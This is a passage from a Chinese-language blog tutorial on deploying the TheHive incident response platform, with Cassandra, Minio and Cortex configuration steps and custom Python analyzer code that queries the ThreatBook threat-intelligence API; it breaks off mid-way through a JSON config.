 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ service cassandra start</span><br></pre></td></tr></table></figure>

<ul>
<li>查询集群状态</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address         Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  192.168.199.35  449.33 KiB  256          100.0%            72e95db1-9c37-4a53-9312-76bd0b2e6ca7  rack1</span><br><span class="line">UN  192.168.199.36  631.65 KiB  256          100.0%            4051f9d4-91de-43e5-9a4a-c3da46417830  rack1</span><br><span class="line">UN  192.168.199.37  437.13 KiB  256          100.0%            8844626f-04c0-4dd3-855e-088935b8dc65  rack1</span><br></pre></td></tr></table></figure></li>
<li><p>初始化数据库</p>
<ul>
<li>修改数据库默认密码（默认账户密码：<code>cassandra</code>/<code>cassandra</code>）</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cqlsh th01 -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER USER cassandra WITH PASSWORD <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; quit;</span><br></pre></td></tr></table></figure>

<ul>
<li>确保所有节点上的用户账户都是一致的</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cqlsh &lt;ip node X&gt; -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER KEYSPACE system_auth WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: 3 &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建名为<code>thehive</code>的<code>KEYSPACE</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE KEYSPACE thehive WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: <span class="string">&#x27;3&#x27;</span> &#125; AND durable_writes = <span class="string">&#x27;true&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建角色<code>thehive</code>，并授予<code>thehive</code> 权限（选择密码）</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE ROLE thehive WITH LOGIN = <span class="literal">true</span> AND PASSWORD = <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; GRANT ALL PERMISSIONS ON KEYSPACE thehive TO <span class="string">&#x27;thehive&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><em>TheHive</em> 相关配置</p>
<p> 由于最新的<em>TheHive</em>集群需要配合<em>ElasticSearch</em>进行索引，因此需要同步更新如下配置：</p>
<ul>
<li>更新<code>/etc/thehive/application.conf</code>配置</li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">db.janusgraph</span> &#123;</span><br><span class="line">  <span class="string">storage</span> &#123;</span><br><span class="line">    <span class="comment">## Cassandra configuration</span></span><br><span class="line">    <span class="attr">backend:</span> <span class="string">cql</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;ip node 1&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 2&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 3&gt;&quot;</span>]</span><br><span class="line">    <span class="attr">username:</span> <span class="string">&quot;cassandra&quot;</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">cql</span> &#123;</span><br><span class="line">      <span class="attr">cluster-name:</span> <span class="string">thp</span></span><br><span class="line">      <span class="attr">keyspace:</span> <span class="string">thehive</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Index configuration</span></span><br><span class="line">  <span class="string">index.search</span> &#123;</span><br><span class="line">    <span class="attr">backend:</span> <span class="string">elasticsearch</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;es node 1&gt;&quot;</span>, <span class="string">&quot;es node 2&quot;</span>, <span class="string">&quot;es node 3&quot;</span>]</span><br><span class="line">    <span class="attr">index-name:</span> <span class="string">thehive</span></span><br><span class="line">    <span class="comment"># auth</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.type=basic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.username=elastic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.password=HelloWorld</span></span><br><span class="line">    <span class="comment"># ssl</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.enabled=true</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.location=/etc/thehive/truststore.jks</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.password=HelloWorld</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a><em>Minio</em></h3><p>​    由于我的文件存储是采用了<em>Minio</em>，所以这里需要配置一下。其实更简单的方式，你可以考虑使用<em>S3</em>。</p>
<ul>
<li>创建目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>创建用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adduser minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建数据卷</p>
<p> 在每台服务器上至少创建2个数据卷</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir -p /srv/minio/&#123;1,2&#125;</span><br><span class="line">$ chown -R minio:minio /srv/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>修改主机名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /etc/hosts</span><br><span class="line">192.168.199.35  minio1</span><br><span class="line">192.168.199.36  minio2</span><br><span class="line">192.168.199.37  minio3</span><br></pre></td></tr></table></figure>

<ul>
<li>安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /opt/minio</span><br><span class="line">$ mkdir /opt/minio/&#123;bin,etc&#125;</span><br><span class="line">$ wget -O /opt/minio/bin/minio https://dl.minio.io/server/minio/release/linux-amd64/minio</span><br><span class="line">$ chown -R minio:minio /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置</p>
<ul>
<li>新建配置文件<code>/opt/minio/etc/minio.conf</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MINIO_OPTS=<span class="string">&quot;server --address :9100 http://minio&#123;1...3&#125;/srv/minio/&#123;1...2&#125;&quot;</span></span><br><span class="line">MINIO_ACCESS_KEY=<span class="string">&quot;admin&quot;</span></span><br><span class="line">MINIO_SECRET_KEY=<span class="string">&quot;HelloWorld&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>新建系统启动文件<code>/usr/lib/systemd/system/minio.service</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=minio</span><br><span class="line">Documentation=https://docs.min.io</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network-online.target</span><br><span class="line">AssertFileIsExecutable=/opt/minio/bin/minio</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory=/opt/minio</span><br><span class="line">User=minio</span><br><span class="line">Group=minio</span><br><span class="line">EnvironmentFile=/opt/minio/etc/minio.conf</span><br><span class="line">ExecStart=/opt/minio/bin/minio <span class="variable">$MINIO_OPTS</span></span><br><span class="line">Restart=always</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">TimeoutStopSec=0</span><br><span class="line">SendSIGKILL=no</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl <span class="built_in">enable</span> minio</span><br><span class="line">$ systemctl start minio.service</span><br></pre></td></tr></table></figure>

<p>注：<em>这里记得确认一下权限的问题，权限不对的话会导致进程起不来。</em></p>
<ul>
<li><p>创建<em>bucket</em></p>
<ul>
<li>登录<em>Minio</em> <strong><a href="http://minio1:9100/">http://minio1:9100</a></strong></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-1.png" alt="Minio-1"></p>
<ul>
<li>创建<em>bucket</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-2.png" alt="Minio-2"></p>
</li>
<li><p>修改<em>TheHive</em>配置文件 <code> /etc/thehive/application.conf</code></p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Attachment storage configuration</span></span><br><span class="line"><span class="string">storage</span> &#123;</span><br><span class="line">  <span class="attr">provider:</span> <span class="string">s3</span></span><br><span class="line">  <span class="string">s3</span> &#123;</span><br><span class="line">    <span class="string">bucket</span> <span class="string">=</span> <span class="string">&quot;thehive&quot;</span></span><br><span class="line">    <span class="string">readTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">writeTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">chunkSize</span> <span class="string">=</span> <span class="number">1</span> <span class="string">MB</span></span><br><span class="line">    <span class="string">endpoint</span> <span class="string">=</span> <span class="string">&quot;http://minio1:9100&quot;</span></span><br><span class="line">    <span class="string">accessKey</span> <span class="string">=</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="string">secretKey</span> <span class="string">=</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">region</span> <span class="string">=</span> <span class="string">&quot;us-east-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">alpakka.s3.path-style-access</span> <span class="string">=</span> <span class="string">force</span></span><br></pre></td></tr></table></figure>

<h3 id="Cortex"><a href="#Cortex" class="headerlink" title="Cortex"></a><em>Cortex</em></h3><ul>
<li><p>修改 <em>Cortex</em> 配置文件  <code>/etc/cortex/application.conf</code></p>
<p>这里注意，官方默认的配置文件有个小问题。当采用<em>Elastic</em>认证的时候需要将<code>username</code>修改为<code>user</code>，否则会报错。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">play.http.secret.key=<span class="string">&quot;QZUm2UgZYXF6axC&quot;</span></span><br><span class="line">search &#123;</span><br><span class="line">  index = cortex</span><br><span class="line">  uri = <span class="string">&quot;https://elasticsearch01:9200,elasticsearch02:9200,elasticsearch03:9200&quot;</span></span><br><span class="line">  user = <span class="string">&quot;elastic&quot;</span>	<span class="comment"># 修改username为user</span></span><br><span class="line">  password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  keyStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  trustStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analyzers-and-Responders"><a href="#Analyzers-and-Responders" class="headerlink" title="Analyzers and Responders"></a><em>Analyzers and Responders</em></h4><p>​    由于在<em>Cortex</em> 3中实现了对<em>dockerized</em>分析器的支持，安装过程已经被大大简化。因此，我们不必纠结于安装插件时的<em>Python</em>或其他库依赖项这种头疼的问题。</p>
<ul>
<li>安装<em>Docker</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 18.04</span></span><br><span class="line">$ wget -O- https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">$ add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable&quot;</span></span><br><span class="line">$ sudo apt-get update </span><br><span class="line">$ sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>

<ul>
<li>给<em>Cortex</em>账户运行<em>Docker</em>的权限</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ usermod -a -G docker cortex</span><br></pre></td></tr></table></figure>

<ul>
<li>更新配置文件<code>/etc/cortex/application.conf</code>，启用<code>analyzers.json</code></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span>	<span class="comment"># 本次新增</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span> <span class="comment"># 本次新增</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>参考<ul>
<li><strong><a href="https://blog.thehive-project.org/2019/11/20/unleash-the-power-of-dockerized-analyzers-in-5-minutes/">Unleash the Power of Dockerized Analyzers in 5 Minutes</a></strong></li>
</ul>
</li>
</ul>
<hr>
<h2 id="如何创建插件"><a href="#如何创建插件" class="headerlink" title="如何创建插件"></a>如何创建插件</h2><p>​    前面有说到<em>Cortex</em>组件默认已经集成了丰富的<em>Analyzers</em>与<em>Responses</em>插件，便于运营人员快速的对安全事件进行分析与响应。在实际使用过程中根据需求场景的不同，我们仍需要进行一些插件的定制化。如何创建插件，官网有很详细的文档介绍，请参考：<a href="https://github.com/TheHive-Project/CortexDocs/blob/master/api/how-to-create-an-analyzer.md"><em><strong>How to Write and Submit an Analyzer</strong></em></a>。以下附上了部分新增的插件代码：</p>
<p><strong>好了，废话少说，放“码”过来！！！</strong></p>
<h3 id="Analyzers-插件"><a href="#Analyzers-插件" class="headerlink" title="Analyzers - 插件"></a>Analyzers - 插件</h3><h4 id="微歩在线"><a href="#微歩在线" class="headerlink" title="微歩在线"></a>微歩在线</h4><p>​    由于我们已经购买了商业（微歩在线）威胁情报，所以我们也和<em>TheHive</em>进行了整合。</p>
<ul>
<li><em><strong>threatbook.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBook</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: Threat Book</span></span><br><span class="line"><span class="string">    https://x.threatbook.cn/nodev4/vb4/API</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.urls = &#123;</span><br><span class="line">            <span class="string">&#x27;compromise&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/dns&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;reputation&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/ip_reputation&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request an url</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &quot;response_code&quot;: -1,</span></span><br><span class="line"><span class="string">            &quot;verbose_msg&quot;: &quot;Invalid Access IP&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;response_code&#x27;</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(r.json())</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ioc&#x27;</span>: k,</span><br><span class="line">                <span class="string">&#x27;malicious&#x27;</span>: v[<span class="string">&#x27;is_malicious&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;confidence&#x27;</span>: v[<span class="string">&#x27;confidence_level&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: v[<span class="string">&#x27;judgments&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reputation</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting reputation IP&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;reputation&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_compromise</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting compromise IoC&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;compromise&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(<span class="built_in">list</span>(results[<span class="string">&#x27;data&#x27;</span>].values())[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    threat = ThreatBook(key)</span><br><span class="line">    <span class="comment"># reputation</span></span><br><span class="line">    ioc = <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = threat.get_reputation(ioc)</span><br><span class="line">    <span class="comment"># compromise</span></span><br><span class="line">    ioc = <span class="string">&#x27;zzv.no-ip.info&#x27;</span></span><br><span class="line">    r = threat.get_compromise(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>threatbook_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threatbook <span class="keyword">import</span> ThreatBook</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ThreatBook API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.threatbook = ThreatBook(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ThreatBook&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Reputation&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Compromise&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw:</span><br><span class="line">            <span class="keyword">if</span> raw[<span class="string">&#x27;malicious&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">                level = <span class="string">&quot;malicious&quot;</span></span><br><span class="line">                value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_reputation(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_compromise(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ThreatBookAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ThreatBook_Compromise.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Compromise&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IP、Domain from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;domain&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;compromise&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ThreatBook_Reputation.json</strong></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Reputation&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the reputation information of IP from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        